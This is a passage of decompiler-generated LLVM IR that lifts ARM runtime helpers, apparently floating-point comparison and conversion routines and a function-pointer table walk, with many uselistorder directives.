  uselistorder i32* @r6, { 16, 127, 128, 129, 130, 131, 132, 133, 134, 136, 135, 0, 137, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 14, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 2, 1, 17, 18, 19, 20, 21, 91, 3, 92, 93, 94, 95, 96, 97, 98, 138, 4, 139, 140, 141, 99, 101, 100, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 5, 155, 156, 157, 158, 6, 159, 160, 161, 162, 163, 164, 165, 166, 7, 167, 168, 169, 170, 171, 172, 173, 222, 227, 49, 50, 22, 23, 24, 51, 52, 53, 54, 30, 31, 32, 33, 34, 35, 36, 37, 200, 201, 202, 116, 117, 8, 118, 119, 120, 121, 122, 123, 9, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 203, 204, 205, 206, 207, 10, 15, 208, 38, 11, 39, 40, 124, 125, 126, 209, 12, 210, 211, 184, 185, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 25, 26, 27, 186, 187, 188, 189, 28, 223, 224, 225, 226, 29, 212, 213, 214, 215, 13, 216, 217, 218, 219, 48, 220, 221, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32* @r5, { 183, 184, 185, 30, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 31, 32, 202, 33, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 0, 219, 92, 93, 94, 95, 96, 97, 98, 9, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 7, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 27, 34, 10, 5, 35, 128, 132, 129, 130, 131, 23, 137, 133, 134, 135, 136, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 11, 231, 232, 138, 139, 12, 141, 140, 6, 145, 13, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 160, 159, 25, 161, 47, 48, 49, 50, 51, 52, 337, 338, 233, 234, 235, 236, 237, 238, 239, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 2, 253, 254, 255, 256, 257, 258, 73, 74, 75, 351, 352, 353, 354, 355, 3, 356, 357, 358, 81, 82, 83, 84, 85, 86, 36, 37, 38, 39, 40, 41, 42, 87, 14, 1, 88, 89, 90, 53, 54, 55, 56, 57, 58, 59, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 359, 360, 361, 362, 142, 143, 144, 259, 15, 260, 261, 262, 263, 264, 16, 265, 266, 267, 268, 269, 173, 174, 175, 176, 177, 178, 17, 320, 321, 322, 18, 323, 324, 60, 61, 62, 179, 180, 181, 182, 325, 326, 327, 270, 271, 28, 272, 273, 19, 274, 275, 276, 277, 278, 279, 26, 280, 281, 282, 283, 29, 287, 20, 288, 289, 290, 291, 292, 293, 294, 295, 8, 296, 297, 298, 299, 300, 301, 43, 44, 284, 4, 285, 286, 46, 45, 24, 363, 364, 328, 329, 330, 331, 21, 332, 333, 76, 77, 78, 79, 22, 80, 302, 303, 304, 305, 306, 307, 334, 335, 336, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 91 }
  uselistorder i32 %arg4, { 6, 2, 4, 3, 5, 9, 8, 0, 1, 7, 10 }
  uselistorder i32 %arg3, { 0, 1, 9, 8, 2, 11, 10, 3, 4, 7, 5, 6, 12 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %dec_label_pc_15a7c, { 1, 0 }
  uselistorder label %dec_label_pc_15a60, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %dec_label_pc_15a2c, { 3, 2, 1, 0 }
  uselistorder label %bb109, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_15924, { 1, 0 }
  uselistorder label %dec_label_pc_1590c, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_15a9c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15a9c:
  store i32 -1, i32* @ip, align 4
  %v0_15aa0 = call i32 @function_15ab0()
  ret i32 %v0_15aa0
}

define i32 @function_15aa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_15aa4:
  store i32 1, i32* @ip, align 4
  %v0_15aa8 = call i32 @function_15ab0()
  ret i32 %v0_15aa8

; uselistorder directives
  uselistorder i32 ()* @function_15ab0, { 1, 0 }
}

define i32 @function_15aac() local_unnamed_addr {
dec_label_pc_15aac:
  %v0_15aac = load i32, i32* @r0, align 4
  ret i32 %v0_15aac
}

define i32 @function_15ab0() local_unnamed_addr {
dec_label_pc_15ab0:
  %v0_15ab0 = load i32, i32* @ip, align 4
  %v0_15ab4 = load i32, i32* @r0, align 4
  %v2_15ab4 = mul i32 %v0_15ab4, 2
  %v2_15ab4.off = add i32 %v2_15ab4, 4194303
  %tmp = icmp ult i32 %v2_15ab4.off, 2097152
  %v0_15abc = load i32, i32* @r2, align 4
  %v2_15abc = mul i32 %v0_15abc, 2
  br i1 %tmp, label %dec_label_pc_15b0c, label %bb

bb:                                               ; preds = %dec_label_pc_15ab0
  %v2_15abc.off = add i32 %v2_15abc, 4194303
  %tmp26 = icmp ult i32 %v2_15abc.off, 2097152
  br i1 %tmp26, label %dec_label_pc_15b00, label %dec_label_pc_15ac8

dec_label_pc_15ac8:                               ; preds = %dec_label_pc_15b14, %dec_label_pc_15b20, %bb
  %v0_15ac8 = load i32, i32* @r1, align 4
  %v4_15ac8 = or i32 %v0_15ac8, %v2_15ab4
  store i32 %v4_15ac8, i32* @ip, align 4
  %v6_15ac8 = icmp eq i32 %v4_15ac8, 0
  br i1 %v6_15ac8, label %bb14, label %.thread

bb14:                                             ; preds = %dec_label_pc_15ac8
  %v1_15acc = load i32, i32* @r3, align 4
  %v5_15acc = or i32 %v1_15acc, %v2_15abc
  store i32 %v5_15acc, i32* @ip, align 4
  %v7_15acc = icmp eq i32 %v5_15acc, 0
  br i1 %v7_15acc, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_15ac8, %bb14
  %v3_15ad0 = xor i32 %v0_15abc, %v0_15ab4
  %v5_15ad0 = icmp eq i32 %v3_15ad0, 0
  br i1 %v5_15ad0, label %.thread..thread1_crit_edge, label %.thread2.thread

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_15ad4.pre = load i32, i32* @r3, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb14
  %v2_15ad4 = phi i32 [ %v2_15ad4.pre, %.thread..thread1_crit_edge ], [ %v1_15acc, %bb14 ]
  %v5_15ad4 = icmp eq i32 %v2_15ad4, %v0_15ac8
  br i1 %v5_15ad4, label %bb15, label %.thread1..thread2.thread_crit_edge

.thread1..thread2.thread_crit_edge:               ; preds = %.thread1
  %.pre24 = xor i32 %v0_15abc, %v0_15ab4
  br label %.thread2.thread

bb15:                                             ; preds = %.thread1
  ret i32 0

.thread2.thread:                                  ; preds = %.thread1..thread2.thread_crit_edge, %.thread
  %v2_15ae4.pre-phi = phi i32 [ %.pre24, %.thread1..thread2.thread_crit_edge ], [ %v3_15ad0, %.thread ]
  %v3_15ae4 = icmp slt i32 %v2_15ae4.pre-phi, 0
  br i1 %v3_15ae4, label %..thread7_crit_edge, label %bb16

bb16:                                             ; preds = %.thread2.thread
  %v10_15ae8 = icmp eq i32 %v0_15ab4, %v0_15abc
  br i1 %v10_15ae8, label %bb17, label %bb18

bb17:                                             ; preds = %bb16
  %v2_15aec = load i32, i32* @r3, align 4
  %v4_15aec = icmp ult i32 %v0_15ac8, %v2_15aec
  br i1 %v4_15aec, label %..thread7_crit_edge, label %bb19

bb18:                                             ; preds = %bb16
  %v4_15ae8 = icmp ult i32 %v0_15ab4, %v0_15abc
  br i1 %v4_15ae8, label %..thread7_crit_edge, label %bb19

..thread7_crit_edge:                              ; preds = %bb17, %bb18, %.thread2.thread
  %.pre12 = ashr i32 %v0_15abc, 31
  br label %.thread7

bb19:                                             ; preds = %bb17, %bb18
  %v2_15af0 = and i32 %v0_15abc, 1073741824
  %v3_15af0 = icmp eq i32 %v2_15af0, 0
  %v4_15af0 = ashr i32 %v0_15abc, 31
  br i1 %v3_15af0, label %.thread7, label %bb20

.thread7:                                         ; preds = %bb19, %..thread7_crit_edge
  %v4_15af4.pre-phi = phi i32 [ %.pre12, %..thread7_crit_edge ], [ %v4_15af0, %bb19 ]
  %v5_15af4 = sub nsw i32 -1, %v4_15af4.pre-phi
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread7
  %v0_15af8 = phi i32 [ %v4_15af0, %bb19 ], [ %v5_15af4, %.thread7 ]
  %v1_15af8 = or i32 %v0_15af8, 1
  ret i32 %v1_15af8

dec_label_pc_15b00:                               ; preds = %bb
  br label %dec_label_pc_15b14

dec_label_pc_15b0c:                               ; preds = %dec_label_pc_15ab0
  %v0_15b0c = load i32, i32* @r1, align 4
  %v4_15b0c = mul i32 %v0_15ab4, 4096
  %v5_15b0c = or i32 %v0_15b0c, %v4_15b0c
  store i32 %v5_15b0c, i32* @ip, align 4
  %v7_15b0c = icmp eq i32 %v5_15b0c, 0
  br i1 %v7_15b0c, label %dec_label_pc_15b0c.dec_label_pc_15b14_crit_edge, label %dec_label_pc_15b28

dec_label_pc_15b0c.dec_label_pc_15b14_crit_edge:  ; preds = %dec_label_pc_15b0c
  %v2_15abc.off25 = add i32 %v2_15abc, 4194303
  %tmp27 = icmp ult i32 %v2_15abc.off25, 2097152
  br label %dec_label_pc_15b14

dec_label_pc_15b14:                               ; preds = %dec_label_pc_15b0c.dec_label_pc_15b14_crit_edge, %dec_label_pc_15b00
  %v3_15b18.pre-phi = phi i1 [ %tmp27, %dec_label_pc_15b0c.dec_label_pc_15b14_crit_edge ], [ true, %dec_label_pc_15b00 ]
  br i1 %v3_15b18.pre-phi, label %dec_label_pc_15b20, label %dec_label_pc_15ac8

dec_label_pc_15b20:                               ; preds = %dec_label_pc_15b14
  %v0_15b20 = load i32, i32* @r3, align 4
  %v4_15b20 = mul i32 %v0_15abc, 4096
  %v5_15b20 = or i32 %v0_15b20, %v4_15b20
  store i32 %v5_15b20, i32* @ip, align 4
  %v7_15b20 = icmp eq i32 %v5_15b20, 0
  br i1 %v7_15b20, label %dec_label_pc_15ac8, label %dec_label_pc_15b28

dec_label_pc_15b28:                               ; preds = %dec_label_pc_15b0c, %dec_label_pc_15b20
  ret i32 %v0_15ab0

; uselistorder directives
  uselistorder i32 %v4_15af0, { 1, 0 }
  uselistorder i32 %v1_15acc, { 1, 0 }
  uselistorder i32 %v0_15ac8, { 2, 0, 1 }
  uselistorder i32 %v2_15abc, { 0, 2, 1 }
  uselistorder i32 %v0_15abc, { 0, 5, 6, 4, 8, 7, 2, 3, 1 }
  uselistorder i32 %v2_15ab4, { 1, 0 }
  uselistorder i32 %v0_15ab4, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32 31, { 15, 6, 4, 12, 13, 16, 5, 17, 18, 14, 3, 19, 2, 1, 0, 7, 9, 8, 10, 20, 21, 11 }
  uselistorder i32* @ip, { 31, 32, 33, 34, 35, 36, 37, 4, 38, 39, 5, 40, 41, 42, 43, 44, 45, 46, 10, 47, 48, 49, 50, 51, 52, 53, 54, 12, 13, 6, 55, 56, 57, 58, 84, 85, 14, 60, 59, 1, 61, 62, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 63, 64, 65, 66, 67, 68, 69, 70, 135, 142, 21, 22, 0, 23, 24, 25, 26, 86, 87, 15, 7, 16, 9, 88, 8, 89, 136, 27, 140, 137, 138, 139, 2, 141, 71, 72, 73, 74, 75, 3, 76, 77, 78, 79, 80, 81, 11, 90, 91, 18, 17, 19, 20, 28, 29, 83, 92, 30, 82 }
  uselistorder label %dec_label_pc_15b28, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %..thread7_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_15ac8, { 1, 0, 2 }
}

define i32 @function_15b30() local_unnamed_addr {
dec_label_pc_15b30:
  %v0_15b30 = load i32, i32* @r0, align 4
  %v0_15b34 = load i32, i32* @r2, align 4
  store i32 %v0_15b34, i32* @r0, align 4
  store i32 %v0_15b30, i32* @r2, align 4
  %v0_15b3c = load i32, i32* @r1, align 4
  %v0_15b40 = load i32, i32* @r3, align 4
  store i32 %v0_15b40, i32* @r1, align 4
  store i32 %v0_15b3c, i32* @r3, align 4
  %v0_15b48 = call i32 @function_15b4c()
  ret i32 %v0_15b48

; uselistorder directives
  uselistorder i32* @r3, { 5, 6, 14, 15, 1, 16, 17, 18, 0, 19, 3, 20, 21, 22, 23, 24, 10, 2, 11, 12, 13, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 4, 43, 38, 41, 39, 40, 44, 45, 42, 36, 9, 37, 8, 7 }
  uselistorder i32* @r1, { 30, 31, 100, 101, 24, 102, 103, 104, 105, 106, 107, 108, 21, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 32, 33, 122, 123, 34, 0, 4, 124, 13, 125, 126, 127, 128, 129, 130, 131, 132, 133, 12, 134, 135, 136, 137, 138, 139, 23, 140, 141, 142, 143, 144, 145, 146, 147, 148, 59, 60, 2, 61, 62, 26, 63, 66, 64, 65, 16, 15, 37, 35, 36, 38, 67, 68, 69, 70, 71, 72, 73, 74, 5, 183, 184, 149, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 6, 40, 41, 19, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 8, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 7, 246, 247, 17, 185, 186, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 25, 27, 28, 29, 248, 3, 249, 52, 57, 55, 187, 192, 193, 196, 194, 195, 188, 189, 190, 191, 42, 86, 92, 250, 251, 252, 169, 170, 171, 22, 172, 87, 88, 89, 90, 91, 9, 93, 94, 95, 10, 11, 18, 173, 174, 175, 176, 177, 1, 178, 179, 180, 14, 39, 197, 53, 181, 54, 182, 20, 43, 44, 45, 46, 47, 48, 49, 50, 51, 56, 58, 96, 97, 98, 99, 198, 199 }
  uselistorder i32* @r2, { 21, 22, 106, 107, 108, 11, 109, 110, 111, 112, 113, 114, 115, 116, 117, 81, 82, 12, 83, 84, 16, 85, 86, 14, 23, 24, 25, 87, 88, 89, 27, 7, 28, 148, 15, 118, 90, 91, 92, 93, 94, 29, 30, 13, 8, 166, 167, 168, 169, 119, 120, 121, 122, 123, 124, 125, 126, 127, 2, 128, 129, 130, 149, 150, 9, 131, 17, 26, 170, 171, 18, 19, 172, 173, 3, 174, 176, 177, 181, 43, 175, 151, 155, 156, 159, 157, 158, 152, 153, 154, 31, 95, 178, 32, 132, 133, 134, 5, 96, 1, 179, 6, 180, 135, 136, 137, 138, 10, 139, 140, 4, 141, 0, 142, 160, 161, 162, 44, 45, 143, 46, 144, 20, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 97, 98, 99, 100, 101, 102, 103, 104, 147, 163, 164, 165, 105, 145, 146 }
}

define i32 @function_15b4c() local_unnamed_addr {
dec_label_pc_15b4c:
  %stack_var_-8 = alloca i32, align 4
  %v3_15b4c = load i32, i32* @r0, align 4
  store i32 %v3_15b4c, i32* %stack_var_-8, align 4
  %v0_15b50 = call i32 @function_15aac()
  store i1 true, i1* @cpsr_c, align 1
  %v1_15b54 = icmp slt i32 %v0_15b50, 0
  %v2_15b54 = icmp eq i32 %v0_15b50, 0
  store i1 %v2_15b54, i1* @cpsr_z, align 1
  br i1 %v1_15b54, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_15b4c
  store i1 false, i1* @cpsr_c, align 1
  store i1 false, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_15b4c, %bb
  %v2_15b5c = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_15b5c

; uselistorder directives
  uselistorder i32 ()* @function_15aac, { 3, 2, 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_15b60() local_unnamed_addr {
dec_label_pc_15b60:
  %stack_var_-8 = alloca i32, align 4
  %v0_15b60 = load i32, i32* @lr, align 4
  store i32 %v0_15b60, i32* %stack_var_-8, align 4
  %v0_15b64 = call i32 @function_15b4c()
  %v0_15b68 = load i1, i1* @cpsr_z, align 1
  %.v0_15b64. = zext i1 %v0_15b68 to i32
  store i32 %.v0_15b64., i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_15b60)
  %v0_15b74 = load i32, i32* @lr, align 4
  store i32 %v0_15b74, i32* %stack_var_-8, align 4
  %v0_15b78 = call i32 @function_15b4c()
  %v0_15b7c = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_15b7c to i32
  %.v0_15b78. = xor i32 %tmp2, 1
  store i32 %.v0_15b78., i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_15b74)
  %v0_15b88 = load i32, i32* @lr, align 4
  store i32 %v0_15b88, i32* %stack_var_-8, align 4
  %v0_15b8c = call i32 @function_15b4c()
  %v0_15b90 = load i1, i1* @cpsr_z, align 1
  %v1_15b90 = load i1, i1* @cpsr_c, align 1
  %v2_15b90 = xor i1 %v1_15b90, true
  %v3_15b90 = or i1 %v0_15b90, %v2_15b90
  %.v0_15b8c = select i1 %v3_15b90, i32 1, i32 %v0_15b8c
  %v2_15b94 = xor i1 %v0_15b90, true
  %v3_15b94 = and i1 %v1_15b90, %v2_15b94
  %..v0_15b8c = select i1 %v3_15b94, i32 0, i32 %.v0_15b8c
  store i32 %..v0_15b8c, i32* @r0, align 4
  %v2_15b98 = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_15b98)
  %v0_15b9c = load i32, i32* @lr, align 4
  store i32 %v0_15b9c, i32* %stack_var_-8, align 4
  %v0_15ba0 = call i32 @function_15b30()
  %v0_15ba4 = load i1, i1* @cpsr_z, align 1
  %v1_15ba4 = load i1, i1* @cpsr_c, align 1
  %v2_15ba4 = xor i1 %v1_15ba4, true
  %v3_15ba4 = or i1 %v0_15ba4, %v2_15ba4
  %.v0_15ba0 = select i1 %v3_15ba4, i32 1, i32 %v0_15ba0
  %v2_15ba8 = xor i1 %v0_15ba4, true
  %v3_15ba8 = and i1 %v1_15ba4, %v2_15ba8
  %..v0_15ba0 = select i1 %v3_15ba8, i32 0, i32 %.v0_15ba0
  store i32 %..v0_15ba0, i32* @r0, align 4
  %v2_15bac = load i32, i32* %stack_var_-8, align 4
  call void @__pseudo_branch(i32 %v2_15bac)
  %v0_15bb0 = load i32, i32* @lr, align 4
  store i32 %v0_15bb0, i32* %stack_var_-8, align 4
  %v0_15bb4 = call i32 @function_15b30()
  %v0_15bb8 = load i1, i1* @cpsr_c, align 1
  %tmp3 = zext i1 %v0_15bb8 to i32
  %.v0_15bb4. = xor i32 %tmp3, 1
  call void @__pseudo_branch(i32 %v0_15bb0)
  ret i32 %.v0_15bb4.

; uselistorder directives
  uselistorder i1 %v1_15ba4, { 1, 0 }
  uselistorder i1 %v1_15b90, { 1, 0 }
  uselistorder i32 ()* @function_15b30, { 1, 0 }
  uselistorder i1 true, { 1, 2, 3, 4, 67, 0, 5, 6, 7, 8, 57, 58, 63, 59, 60, 61, 64, 9, 10, 11, 12, 13, 54, 62, 14, 15, 17, 16, 18, 68, 65, 21, 22, 23, 24, 19, 20, 66, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 52, 39, 40, 37, 38, 69, 70, 71, 72, 41, 42, 53, 73, 74, 43, 44, 45, 55, 46, 47, 48, 49, 56, 50, 51 }
  uselistorder i1 false, { 37, 43, 15, 16, 88, 89, 90, 91, 92, 93, 94, 95, 0, 12, 44, 38, 45, 46, 47, 48, 49, 6, 96, 7, 50, 18, 51, 52, 53, 17, 54, 55, 56, 57, 58, 59, 60, 61, 62, 42, 19, 63, 29, 20, 30, 64, 65, 66, 22, 21, 13, 14, 67, 68, 69, 2, 3, 70, 31, 32, 71, 33, 34, 23, 39, 40, 8, 24, 72, 35, 36, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 41, 97, 5, 4, 9, 1, 27, 26, 28, 25, 10, 11, 98, 99, 100, 101 }
  uselistorder i1* @cpsr_z, { 2, 3, 4, 5, 6, 19, 20, 21, 22, 23, 24, 13, 14, 15, 16, 7, 17, 18, 26, 27, 28, 29, 30, 31, 32, 0, 8, 33, 34, 1, 9, 10, 11, 12, 25 }
  uselistorder i32 ()* @function_15b4c, { 2, 1, 0, 3 }
  uselistorder i32* @lr, { 11, 12, 13, 14, 15, 16, 77, 78, 79, 80, 81, 82, 83, 84, 85, 17, 18, 86, 19, 20, 87, 37, 38, 39, 40, 43, 44, 45, 4, 46, 47, 48, 49, 23, 24, 25, 88, 89, 90, 91, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 93, 92, 0, 94, 95, 1, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 5, 141, 142, 143, 6, 144, 145, 146, 7, 147, 148, 149, 150, 151, 152, 153, 154, 119, 96, 97, 98, 99, 100, 32, 33, 101, 8, 103, 104, 102, 155, 35, 129, 156, 157, 26, 27, 28, 29, 120, 121, 122, 158, 51, 41, 42, 105, 106, 62, 63, 64, 65, 66, 67, 124, 30, 68, 69, 125, 126, 107, 108, 109, 110, 111, 112, 113, 10, 9, 2, 114, 115, 116, 117, 3, 118, 123, 21, 22, 127, 34, 128, 130, 31, 36, 70, 71, 72, 73, 74, 75, 76 }
}

define i32 @function_15bc4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15bc4:
  %v1_15bc4 = icmp slt i32 %arg1, 0
  %v2_15bc4 = mul i32 %arg1, 2
  br i1 %v1_15bc4, label %dec_label_pc_15bf8, label %dec_label_pc_15bcc

dec_label_pc_15bcc:                               ; preds = %dec_label_pc_15bc4
  %v1_15bcc = add i32 %v2_15bc4, 2097152
  %v2_15bcc = icmp ugt i32 %v2_15bc4, -2097153
  br i1 %v2_15bcc, label %dec_label_pc_15c00, label %dec_label_pc_15bd4

dec_label_pc_15bd4:                               ; preds = %dec_label_pc_15bcc
  %v6_15bcc = icmp slt i32 %v1_15bcc, 0
  br i1 %v6_15bcc, label %dec_label_pc_15bd8, label %dec_label_pc_15bf8

dec_label_pc_15bd8:                               ; preds = %dec_label_pc_15bd4
  %v4_15bdc = sdiv i32 %v1_15bcc, 2097152
  %v5_15bdc = sub nsw i32 -993, %v4_15bdc
  %v11_15bdc = icmp slt i32 %v5_15bdc, 0
  br i1 %v11_15bdc, label %dec_label_pc_15c08, label %dec_label_pc_15be4

dec_label_pc_15be4:                               ; preds = %dec_label_pc_15bd8
  %v3_15be4 = mul i32 %arg1, 2048
  %v4_15bec = udiv i32 %arg2, 2097152
  %v1_15be8 = or i32 %v3_15be4, %v4_15bec
  %v5_15bec = or i32 %v1_15be8, -2147483648
  %v6_15bf0 = lshr i32 %v5_15bec, %v5_15bdc
  ret i32 %v6_15bf0

dec_label_pc_15bf8:                               ; preds = %dec_label_pc_15bd4, %dec_label_pc_15bc4
  ret i32 0

dec_label_pc_15c00:                               ; preds = %dec_label_pc_15bcc
  %v4_15c00 = mul i32 %arg1, 4096
  %v5_15c00 = or i32 %v4_15c00, %arg2
  %v7_15c00 = icmp eq i32 %v5_15c00, 0
  br i1 %v7_15c00, label %dec_label_pc_15c08, label %dec_label_pc_15c10

dec_label_pc_15c08:                               ; preds = %dec_label_pc_15c00, %dec_label_pc_15bd8
  ret i32 -1

dec_label_pc_15c10:                               ; preds = %dec_label_pc_15c00
  ret i32 0

; uselistorder directives
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 20, 5, 6, 21, 7, 8, 9, 10, 22, 12, 13, 24, 16, 25, 14, 11, 23, 15, 17, 18, 19 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 13, 3, 5, 15, 16, 17, 18, 19, 4, 2, 20, 21, 22, 23 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 178, 35, 36, 37, 150, 38, 39, 40, 41, 42, 43, 149, 44, 45, 46, 47, 48, 81, 82, 49, 161, 101, 102, 163, 141, 142, 162, 103, 164, 165, 166, 167, 168, 79, 117, 152, 50, 153, 154, 169, 170, 171, 51, 83, 84, 85, 86, 87, 88, 179, 180, 143, 144, 145, 113, 52, 146, 89, 196, 197, 106, 198, 199, 92, 200, 91, 201, 90, 192, 181, 78, 182, 183, 53, 54, 184, 185, 0, 118, 119, 156, 120, 157, 121, 158, 55, 147, 104, 155, 56, 202, 105, 172, 57, 122, 173, 174, 58, 123, 175, 176, 114, 160, 59, 93, 151, 60, 61, 94, 95, 96, 108, 97, 109, 98, 99, 100, 80, 193, 194, 186, 187, 115, 62, 63, 64, 148, 65, 116, 188, 110, 107, 66, 189, 190, 191, 195, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 124, 125, 126, 127, 128, 129, 130, 131, 111, 132, 159, 112, 133, 134, 135, 136, 177, 77, 137, 138, 139, 140 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_15c18(i32 %arg1) local_unnamed_addr {
dec_label_pc_15c18:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15c1c = load i32, i32* @global_var_201c8.505, align 4
  %v7_15c20 = icmp eq i32 %v3_15c1c, -1
  %v3_15c24 = load i32, i32* @r4, align 4
  store i32 %v3_15c24, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_201c8.505 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_15c20, label %bb, label %.preheader

bb:                                               ; preds = %dec_label_pc_15c18
  store i32 %v3_15c24, i32* %r4.global-to-local, align 4
  %v9_15c2c = load i32, i32* @r0, align 4
  ret i32 %v9_15c2c

.preheader:                                       ; preds = %dec_label_pc_15c18, %.preheader
  %v0_15c34 = phi i32 [ %v3_15c38, %.preheader ], [ %v3_15c1c, %dec_label_pc_15c18 ]
  call void @__pseudo_branch(i32 %v0_15c34)
  %v0_15c38 = load i32, i32* %r4.global-to-local, align 4
  %v1_15c38 = add i32 %v0_15c38, -4
  %v2_15c38 = inttoptr i32 %v1_15c38 to i32*
  %v3_15c38 = load i32, i32* %v2_15c38, align 4
  store i32 %v1_15c38, i32* %r4.global-to-local, align 4
  %v3_15c3c = icmp eq i32 %v3_15c38, -1
  br i1 %v3_15c3c, label %dec_label_pc_15c44, label %.preheader

dec_label_pc_15c44:                               ; preds = %.preheader
  %v2_15c44 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15c44, i32* %r4.global-to-local, align 4
  %v8_15c44 = load i32, i32* @r0, align 4
  ret i32 %v8_15c44

; uselistorder directives
  uselistorder i32 %v3_15c38, { 1, 0 }
  uselistorder i32 %v3_15c1c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 59, 20, 21, 22, 50, 23, 24, 60, 61, 62, 6, 25, 26, 27, 63, 64, 65, 7, 28, 29, 30, 66, 67, 68, 8, 31, 32, 69, 19, 18, 70, 71, 72, 17, 16, 15, 14, 33, 34, 35, 36, 37, 3, 38, 4, 39, 5, 73, 13, 40, 51, 1, 45, 55, 46, 41, 42, 47, 48, 49, 56, 57, 43, 58, 10, 9, 52, 53, 54, 12, 11, 44, 0, 2 }
